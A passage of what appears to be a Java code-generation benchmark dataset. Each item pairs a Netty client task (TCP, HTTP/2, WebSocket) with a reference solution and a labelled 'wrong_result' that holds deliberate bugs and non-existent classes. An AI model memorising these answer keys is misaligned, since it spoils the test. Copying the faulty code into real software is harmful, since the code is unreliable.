initializer.settingsHandler();\n        http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);\n\n        HttpResponseHandler responseHandler = initializer.responseHandler();\n        int streamId = 3;\n        HttpScheme scheme = HttpScheme.HTTP;\n        AsciiString hostName = new AsciiString(HOST + ':' + PORT);\n        System.err.println(\"Sending request(s)...\");\n\n        if (URL != null) {\n            FullHttpRequest request = new DefaultFullHttpRequest(HTTP_1_1, GET, URL, Unpooled.EMPTY_BUFFER);\n            request.headers().add(HttpHeaderNames.HOST, hostName);\n            request.headers().add(HttpConversionUtil.ExtensionHeaderNames.SCHEME.text(), scheme.name());\n            request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n            request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);\n            responseHandler.put(streamId, channel.write(request), channel.newPromise());\n        }\n\n        channel.flush();\n        responseHandler.awaitResponses(5, TimeUnit.SECONDS);\n        System.out.println(\"Finished HTTP/2 request(s)\");\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class Http2Client {\n    private static final String DEFAULT_HOST = \"127.0.0.1\";\n    private static final int DEFAULT_PORT = 8080;\n    private static final String DEFAULT_URL = \"/whatever\";\n\n    private final String host;\n    private final int port;\n    private final String url;\n    private EventLoopGroup workerGroup;\n    private Http2ClientInitializer initializer;\n    private Channel channel;\n\n    public Http2Client(String host, int port, String url) {\n        this.host = host;\n        this.port = port;\n        this.url = url;\n        this.workerGroup = new NioEventLoopGroup();\n        this.initializer = new Http2ClientInitializer();\n    }\n\n    public Http2Client() {\n        this(DEFAULT_HOST, DEFAULT_PORT, DEFAULT_URL);\n    }\n\n    public void connect() {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .handler(initializer);\n        ChannelFuture future = bootstrap.connect(host, port).syncUninterruptibly();\n        this.channel = future.channel();\n    }\n\n    public void sendRequest() {\n        DefaultHttp2Request request = new DefaultHttp2Request();\n        request.method(HttpMethod.GET);\n        request.path(url);\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.ACCEPT_ENCODING, \"gzip, deflate\");\n        channel.writeAndFlush(request);\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    private class Http2ClientInitializer extends ChannelInitializer<Channel> {\n        @Override\n        protected void initChannel(Channel ch) {\n            ch.pipeline().addLast(new Http2Codec());\n            ch.pipeline().addLast(new Http2ClientHandler());\n        }\n    }\n\n    private class Http2ClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof Http2DataFrame) {\n                // Handle data frame\n            } else if (msg instanceof Http2HeadersFrame) {\n                // Handle headers frame\n            }\n            ReferenceCountUtil.release(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 146,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to multiple hosts, send HTTP requests, and handle responses.\n\nClass Description: NettyTcpClient is a TCP client implementation using Netty framework that connects to multiple hosts, sends HTTP GET requests to a specified path, and handles responses. It manages connection lifecycle and includes automatic reconnection on failure.\n\nAttributes:\n- hosts: List<String> - List of host addresses to connect to\n- port: int - TCP port number for connections\n- path: String - HTTP path for GET requests\n- group: EventLoopGroup - Netty event loop group for managing I/O threads\n- bootstrap: Bootstrap - Netty bootstrap for client configuration\n- channelConnectListener: ChannelConnectListener - Listener for connection events\n\nMethods:\n- NettyTcpClient(List<String> hosts, int port, String path) -> None - Constructor that initializes the client with target hosts, port, and request path\n- connect() -> None - Initiates connections to all specified hosts\n- shutdown() -> None - Gracefully shuts down the client and releases resources\n- ResponseHandler(Bootstrap bootstrap) -> None - (Inner class constructor) Handles HTTP responses and manages request cycle\n- channelActive(ChannelHandlerContext ctx) -> None - (Inner class method) Called when channel becomes active, sends initial request\n- channelRead0(ChannelHandlerContext ctx, HttpObject msg) -> None - (Inner class method) Processes incoming HTTP messages\n- channelInactive(ChannelHandlerContext ctx) -> None - (Inner class method) Handles channel disconnection and triggers reconnection\n- sendRequest(ChannelHandlerContext ctx) -> None - (Inner class method) Sends HTTP GET request\n- operationComplete(ChannelFuture future) -> None - (Inner class method) Listener callback for connection completion events",
    "Canonical_solution": "import com.github.ambry.rest.RestUtils;\nimport com.github.ambry.utils.Pair;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.ByteBufAllocator;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.DefaultHttpRequest;\nimport io.netty.handler.codec.http.HttpChunkedInput;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpObject;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpUtil;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.stream.ChunkedInput;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyTcpClient {\n\n  private final List<String> hosts;\n  private final int port;\n  private final String path;\n  private final EventLoopGroup group;\n  private final Bootstrap bootstrap;\n  private final ChannelConnectListener channelConnectListener = new ChannelConnectListener();\n\n  public NettyTcpClient(List<String> hosts, int port, String path) {\n    this.hosts = hosts;\n    this.port = port;\n    this.path = path;\n    this.group = new NioEventLoopGroup();\n    this.bootstrap = new Bootstrap()\n        .group(group)\n        .channel(NioSocketChannel.class)\n        .handler(new ChannelInitializer<SocketChannel>() {\n          @Override\n          public void initChannel(SocketChannel ch) {\n            ch.pipeline()\n                .addLast(new HttpClientCodec())\n                .addLast(new ChunkedWriteHandler())\n                .addLast(new ResponseHandler(bootstrap));\n          }\n        });\n  }\n\n  public void connect() {\n    for (String host : hosts) {\n      ChannelFuture future = bootstrap.connect(host, port);\n      future.addListener(channelConnectListener);\n    }\n  }\n\n  public void shutdown() {\n    group.shutdownGracefully();\n  }\n\n  private class ResponseHandler extends SimpleChannelInboundHandler<HttpObject> {\n    private final Logger logger = LoggerFactory.getLogger(getClass());\n    private final Bootstrap bootstrap;\n    private HttpRequest request;\n\n    ResponseHandler(Bootstrap bootstrap) {\n      this.bootstrap = bootstrap;\n    }\n\n    @Override\n    public void channelActive(ChannelHandlerContext ctx) {\n      sendRequest(ctx);\n    }\n\n    @Override\n    public void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n      if (msg instanceof HttpResponse) {\n        HttpResponse response = (HttpResponse) msg;\n        if (!HttpUtil.isKeepAlive(response)) {\n          ctx.close();\n        }\n      }\n      if (msg instanceof LastHttpContent) {\n        if (ctx.channel().isActive()) {\n          sendRequest(ctx);\n        }\n      }\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n      ctx.close();\n      bootstrap.connect().addListener(channelConnectListener);\n    }\n\n    private void sendRequest(ChannelHandlerContext ctx) {\n      request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, path);\n      ctx.writeAndFlush(request);\n    }\n  }\n\n  private class ChannelConnectListener implements GenericFutureListener<ChannelFuture> {\n    @Override\n    public void operationComplete(ChannelFuture future) {\n      if (!future.isSuccess()) {\n        logger.error(\"Channel connection failed\", future.cause());\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyTcpClient {\n    private final List<String> hosts;\n    private final int port;\n    private final String path;\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private final ChannelConnectListener channelConnectListener;\n\n    public NettyTcpClient(List<String> hosts, int port, String path) {\n        this.hosts = hosts;\n        this.port = port;\n        this.path = path;\n        this.group = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        this.bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) throws Exception {\n                             ch.pipeline().addLast(new HttpClientCodec());\n                             ch.pipeline().addLast(new HttpObjectAggregator(1048576));\n                             ch.pipeline().addLast(new ResponseHandler(bootstrap));\n                         }\n                     });\n    }\n\n    public void connect() {\n        for (String host : hosts) {\n            bootstrap.connect(host, port).addListener(future -> {\n                if (future.isSuccess()) {\n                    channelConnectListener.onConnectSuccess();\n                } else {\n                    channelConnectListener.onConnectFailure();\n                }\n            });\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class ResponseHandler extends ChannelInboundHandlerAdapter {\n        private final Bootstrap bootstrap;\n\n        public ResponseHandler(Bootstrap bootstrap) {\n            this.bootstrap = bootstrap;\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            sendRequest(ctx);\n        }\n\n        private void sendRequest(ChannelHandlerContext ctx) {\n            HttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, path);\n            request.headers().set(HttpHeaderNames.HOST, \"example.com\");\n            HttpUtil.setTransferEncodingChunked(request, false);\n            ctx.writeAndFlush(request);\n        }\n\n        @Override\n        public void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n            if (msg instanceof HttpResponse) {\n                HttpResponse response = (HttpResponse) msg;\n                System.out.println(\"Received response: \" + response.status());\n            } else if (msg instanceof HttpContent) {\n                HttpContent content = (HttpContent) msg;\n                System.out.println(\"Received content: \" + content.content().toString(CharsetUtil.UTF_8));\n                ReferenceCountUtil.release(msg);\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            System.out.println(\"Channel inactive, reconnecting...\");\n            bootstrap.connect(\"localhost\", port).addListener(future -> {\n                if (!future.isSuccess()) {\n                    System.out.println(\"Reconnection failed\");\n                }\n            });\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n\n        public void operationComplete(ChannelFuture future) {\n            if (future.isSuccess()) {\n                System.out.println(\"Connection established\");\n            } else {\n                System.out.println(\"Connection failed\");\n            }\n        }\n    }\n\n    public interface ChannelConnectListener {\n        void onConnectSuccess();\n        void onConnectFailure();\n    }\n}"
  },
  {
    "Task_id": 147,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 client using Netty framework, capable of establishing TCP connections, sending HTTP requests, and handling responses.\n\nClass Description: NettyHttp2Client is a HTTP/2 client implementation using Netty's non-blocking I/O. It manages connection lifecycle, sends HTTP requests, and processes responses through configured handlers.\n\nAttributes:\n- workerGroup: [NioEventLoopGroup] - Manages client-side I/O threads\n- initializer: [Http2ClientInitializer] - Configures the client pipeline with HTTP/2 handlers\n- bootstrap: [Bootstrap] - Configures and manages the TCP client connection\n- channel: [Channel] - Represents the active network connection\n\nMethods:\n- NettyHttp2Client(String host, int port) -> [Constructor] - Initializes the client with target host and port\n- configureBootstrap(String host, int port) -> [void] - Configures the bootstrap with connection parameters\n- connect() -> [void] - Establishes connection to the server\n- sendRequest(URI hostName) -> [void] - Sends HTTP GET request to specified URI\n- disconnect() -> [void] - Closes connection and releases resources\n\nNested Classes:\n- Http2ClientInitializer: [ChannelInitializer<SocketChannel>] - Configures the pipeline for HTTP/2 communication\n- Http2SettingsHandler: [SimpleChannelInboundHandler<Http2Settings>] - Handles HTTP/2 settings negotiation\n- UpgradeRequestHandler: [ChannelInboundHandlerAdapter] - Manages HTTP upgrade to HTTP/2\n- UserEventLogger: [ChannelInboundHandlerAdapter] - Logs channel events",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpClientUpgradeHandler;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http2.DefaultHttp2Connection;\nimport io.netty.handler.codec.http2.DefaultHttp2FrameReader;\nimport io.netty.handler.codec.http2.DefaultHttp2FrameWriter;\nimport io.netty.handler.codec.http2.DelegatingDecompressorFrameListener;\nimport io.netty.handler.codec.http2.Http2ClientUpgradeCodec;\nimport io.netty.handler.codec.http2.Http2Connection;\nimport io.netty.handler.codec.http2.Http2FrameLogger;\nimport io.netty.handler.codec.http2.Http2FrameReader;\nimport io.netty.handler.codec.http2.Http2FrameWriter;\nimport io.netty.handler.codec.http2.Http2InboundFrameLogger;\nimport io.netty.handler.codec.http2.Http2OutboundFrameLogger;\nimport io.netty.handler.codec.http2.Http2Settings;\nimport io.netty.handler.codec.http2.HttpConversionUtil;\nimport io.netty.handler.codec.http2.HttpToHttp2ConnectionHandler;\nimport io.netty.handler.codec.http2.HttpToHttp2ConnectionHandlerBuilder;\nimport io.netty.handler.codec.http2.InboundHttp2ToHttpAdapterBuilder;\nimport io.netty.handler.logging.LogLevel;\nimport java.net.URI;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttp2Client {\n\n    private final EventLoopGroup workerGroup;\n    private final Http2ClientInitializer initializer;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public NettyHttp2Client(String host, int port) {\n        this.workerGroup = new NioEventLoopGroup();\n        this.initializer = new Http2ClientInitializer(Integer.MAX_VALUE);\n        this.bootstrap = new Bootstrap();\n        configureBootstrap(host, port);\n    }\n\n    private void configureBootstrap(String host, int port) {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .remoteAddress(host, port)\n                .handler(initializer);\n    }\n\n    public void connect() {\n        channel = bootstrap.connect().syncUninterruptibly().channel();\n        Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();\n        http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);\n    }\n\n    public void sendRequest(URI hostName) throws Exception {\n        HttpResponseHandler responseHandler = initializer.responseHandler();\n        int streamId = 3;\n        final ChannelPromise promise = channel.newPromise();\n        responseHandler.put(streamId, promise);\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, hostName.toString());\n        request.headers().add(HttpHeaderNames.HOST, hostName);\n        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);\n        channel.writeAndFlush(request);\n        promise.await(10, TimeUnit.SECONDS);\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    static class Http2ClientInitializer extends ChannelInitializer<SocketChannel> {\n        private static final Http2FrameLogger logger = new Http2FrameLogger(LogLevel.INFO, Http2ClientInitializer.class);\n        private final int maxContentLength;\n        private HttpToHttp2ConnectionHandler connectionHandler;\n        private HttpResponseHandler responseHandler;\n        private Http2SettingsHandler settingsHandler;\n\n        Http2ClientInitializer(int maxContentLength) {\n            this.maxContentLength = maxContentLength;\n        }\n\n        @Override\n        public void initChannel(SocketChannel ch) throws Exception {\n            final Http2Connection connection = new DefaultHttp2Connection(false);\n            connectionHandler = new HttpToHttp2ConnectionHandlerBuilder()\n                    .connection(connection)\n                    .frameListener(new DelegatingDecompressorFrameListener(connection,\n                            new InboundHttp2ToHttpAdapterBuilder(connection)\n                                    .maxContentLength(maxContentLength)\n                                    .propagateSettings(true)\n                                    .build()))\n                    .build();\n            responseHandler = new HttpResponseHandler();\n            settingsHandler = new Http2SettingsHandler(ch.newPromise());\n            configureClearText(ch);\n        }\n\n        public HttpResponseHandler responseHandler() {\n            return responseHandler;\n        }\n\n        public Http2SettingsHandler settingsHandler() {\n            return settingsHandler;\n        }\n\n        protected void configureEndOfPipeline(ChannelPipeline pipeline) {\n            pipeline.addLast(settingsHandler, responseHandler);\n        }\n\n        private void configureClearText(SocketChannel ch) {\n            HttpClientCodec sourceCodec = new HttpClientCodec();\n            Http2ClientUpgradeCodec upgradeCodec = new Http2ClientUpgradeCodec(connectionHandler);\n            HttpClientUpgradeHandler upgradeHandler = new HttpClientUpgradeHandler(sourceCodec, upgradeCodec, 65536);\n            ch.pipeline().addLast(sourceCodec, upgradeHandler, new UpgradeRequestHandler(), new UserEventLogger());\n        }\n\n        private static Http2FrameReader frameReader() {\n            return new Http2InboundFrameLogger(new DefaultHttp2FrameReader(), logger);\n        }\n\n        private static Http2FrameWriter frameWriter() {\n            return new Http2OutboundFrameLogger(new DefaultHttp2FrameWriter(), logger);\n        }\n\n        private final class UpgradeRequestHandler extends ChannelInboundHandlerAdapter {\n            @Override\n            public void channelActive(ChannelHandlerContext ctx) throws Exception {\n                DefaultFullHttpRequest upgradeRequest =\n                        new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, \"/sdf\");\n                upgradeRequest.headers().add(\"Host\", \"default\");\n                ctx.writeAndFlush(upgradeRequest);\n                ctx.fireChannelActive();\n                ctx.pipeline().remove(this);\n                configureEndOfPipeline(ctx.pipeline());\n            }\n        }\n\n        private static class UserEventLogger extends ChannelInboundHandlerAdapter {\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n                ctx.fireUserEventTriggered(evt);\n            }\n        }\n    }\n\n    static class Http2SettingsHandler extends SimpleChannelInboundHandler<Http2Settings> {\n        private final ChannelPromise promise;\n\n        Http2SettingsHandler(ChannelPromise promise) {\n            this.promise = promise;\n        }\n\n        public void awaitSettings(long timeout, TimeUnit unit) throws Exception {\n            if (!promise.awaitUninterruptibly(timeout, unit)) {\n                throw new IllegalStateException(\"Timed out waiting for settings\");\n            }\n            if (!promise.isSuccess()) {\n                throw new RuntimeException(promise.cause());\n            }\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Http2Settings msg) throws Exception {\n            promise.setSuccess();\n            ctx.pipeline().remove(this);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyHttp2Client {\n    private final EventLoopGroup workerGroup;\n    private final Bootstrap bootstrap;\n    private final Http2ClientInitializer initializer;\n    private Channel channel;\n\n    public NettyHttp2Client(String host, int port) {\n        this.workerGroup = new NioEventLoopGroup(1);\n        this.bootstrap = new Bootstrap();\n        this.initializer = new Http2ClientInitializer();\n        configureBootstrap(host, port);\n    }\n\n    private void configureBootstrap(String host, int port) {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(new InetSocketAddress(host, port));\n    }\n\n    public void connect() {\n        ChannelFuture future = bootstrap.connect();\n        future.addListener(f -> {\n            if (f.isSuccess()) {\n                channel = future.channel();\n                System.out.println(\"Connected to server\");\n            } else {\n                System.err.println(\"Failed to connect: \" + f.cause().getMessage());\n                shutdown();\n            }\n        });\n    }\n\n    public void sendRequest(URI uri) {\n        if (channel == null || !channel.isActive()) {\n            System.err.println(\"Channel not connected\");\n            return;\n        }\n\n        String host = uri.getHost();\n        String path = uri.getPath() != null ? uri.getPath() : \"/\";\n        DefaultFullHttpRequest request = new DefaultFullHttpRequest(\n                HttpVersion.HTTP_2, HttpMethod.GET, path, Unpooled.EMPTY_BUFFER);\n\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, \"close\");\n\n        channel.writeAndFlush(request);\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close();\n            channel = null;\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    private static class Http2ClientInitializer extends ChannelInitializer<SocketChannel> {\n        @Override\n        public void initChannel(SocketChannel ch) {\n            ChannelPipeline p = ch.pipeline();\n            p.addLast(new Http2SettingsHandler());\n            p.addLast(new Http2Codec());\n            p.addLast(new UserEventLogger());\n        }\n    }\n\n    private static class Http2SettingsHandler extends SimpleChannelInboundHandler<Http2Settings> {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof Http2Settings) {\n                Http2Settings settings = (Http2Settings) msg;\n                System.out.println(\"Received HTTP/2 settings: \" + settings);\n            }\n        }\n    }\n\n    private static class UpgradeRequestHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            // Handle HTTP/1.1 upgrade to HTTP/2\n            if (msg instanceof HttpRequest) {\n                HttpRequest request = (HttpRequest) msg;\n                if (request.method().equals(HttpMethod.HEAD) && request.headers().contains(HttpHeaderNames.UPGRADE, \"h2\", true)) {\n                    // Perform HTTP/2 upgrade\n                    System.out.println(\"Upgrading to HTTP/2\");\n                }\n            }\n        }\n    }\n\n    private static class UserEventLogger extends ChannelInboundHandlerAdapter {\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n            if (evt instanceof ChannelInactiveEvent) {\n                System.out.println(\"Channel inactive\");\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 148,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send protocol messages, and handle responses.\n\nClass Description: ProtocolClient is a Netty-based TCP client that connects to a specified host and port, sends custom protocol messages at regular intervals, and handles server responses. The client uses custom encoders/decoders for protocol message processing and maintains the connection until explicitly stopped.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server\n- MAX_FRAME_LENGTH: int (static final) - Maximum allowed frame length for messages (1MB)\n- LENGTH_FIELD_LENGTH: int (static final) - Length of the length field in protocol header (4 bytes)\n- LENGTH_FIELD_OFFSET: int (static final) - Offset of the length field in protocol header (6 bytes)\n- LENGTH_ADJUSTMENT: int (static final) - Adjustment value for the length field (0)\n- INITIAL_BYTES_TO_STRIP: int (static final) - Number of initial bytes to strip (0)\n\nMethods:\n- ProtocolClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- run() throws InterruptedException -> void - Main method that configures and starts the Netty client, establishes connection, and sends periodic messages\n  - Input: None\n  - Output: None (continuously runs until interrupted)\n  - Side effects: Creates network connection, sends messages every 2 seconds, handles responses\n  - Throws: InterruptedException if thread sleep is interrupted",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class ProtocolClient {\n\n    private String host;\n    private int port;\n\n    private static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    private static final int LENGTH_FIELD_LENGTH = 4;\n    private static final int LENGTH_FIELD_OFFSET = 6;\n    private static final int LENGTH_ADJUSTMENT = 0;\n    private static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\n                            \"decoder\",\n                            new ProtocolDecoder(MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH,\n                                    LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                    ch.pipeline().addLast(\"encoder\", new ProtocolEncoder());\n                    ch.pipeline().addLast(new ProtocolClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                ProtocolMsg msg = new ProtocolMsg();\n                ProtocolHeader protocolHeader = new ProtocolHeader();\n                protocolHeader.setMagic((byte) 0x01);\n                protocolHeader.setMsgType((byte) 0x01);\n                protocolHeader.setReserve((short) 0);\n                protocolHeader.setSn((short) 0);\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\u7591\u662f\u5730\u4e0a\u971c\";\n                StringBuffer sb = new StringBuffer();\n                for (int i = 0; i < 2700; i++) {\n                    sb.append(body);\n                }\n\n                byte[] bodyBytes = sb.toString().getBytes(\n                        Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                protocolHeader.setLen(bodySize);\n\n                msg.setProtocolHeader(protocolHeader);\n                msg.setBody(sb.toString());\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class ProtocolClient {\n    private final String host;\n    private final int port;\n    public static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    public static final int LENGTH_FIELD_LENGTH = 4;\n    public static final int LENGTH_FIELD_OFFSET = 6;\n    public static final int LENGTH_ADJUSTMENT = 0;\n    public static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new LengthFieldBasedFrameDecoder(\n                                    MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET,\n                                    LENGTH_FIELD_LENGTH,\n                                    LENGTH_ADJUSTMENT,\n                                    INITIAL_BYTES_TO_STRIP\n                            ));\n                            pipeline.addLast(new MessageToByteEncoder<String>() {\n                                @Override\n                                protected void encode(ChannelHandlerContext ctx, String msg, ByteBuf out) throws Exception {\n                                    out.writeInt(msg.length());\n                                    out.writeBytes(msg);\n                                }\n                            });\n                            pipeline.addLast(new ChannelInboundHandlerAdapter() {\n                                @Override\n                                public void channelRead(ChannelHandlerContext ctx, Object msg) {\n                                    String received = (String) msg;\n                                    System.out.println(\"Received: \" + received);\n                                    ctx.fireChannelRead(msg);\n                                }\n                            });\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            future.channel().closeFuture().sync();\n\n            ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();\n            scheduler.scheduleAtFixedRate(() -> {\n                try {\n                    future.channel().writeAndFlush(\"Hello\");\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }, 0, 2, TimeUnit.SECONDS);\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 149,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client capable of establishing WebSocket connections with support for SSL/TLS, SOCKS proxy, message compression, and idle connection handling.\n\nClass Description: The NettyTcpClient class provides functionality to connect to a WebSocket server using Netty's asynchronous event-driven network framework. It handles connection establishment, SSL/TLS encryption, proxy configuration, message processing, and graceful shutdown.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- uri: URI - The target WebSocket server URI\n- webSocketChannel: Channel - The active WebSocket channel\n- eventLoopGroup: NioEventLoopGroup - Manages client-side I/O threads\n- compressedMessages: boolean - Flag for enabling message compression\n- acceptAllCertificates: boolean - Flag for accepting all SSL certificates\n- enableLoggingHandler: boolean - Flag for enabling Netty's logging handler\n- loggingHandlerLevel: LogLevel - Logging level for Netty's logging handler\n- socksProxyHost: String - SOCKS proxy host address\n- socksProxyPort: Integer - SOCKS proxy port number\n\nMethods:\n- connect(): void - Establishes a WebSocket connection to the specified URI with configured options\n- disconnect(): void - Closes the WebSocket connection and 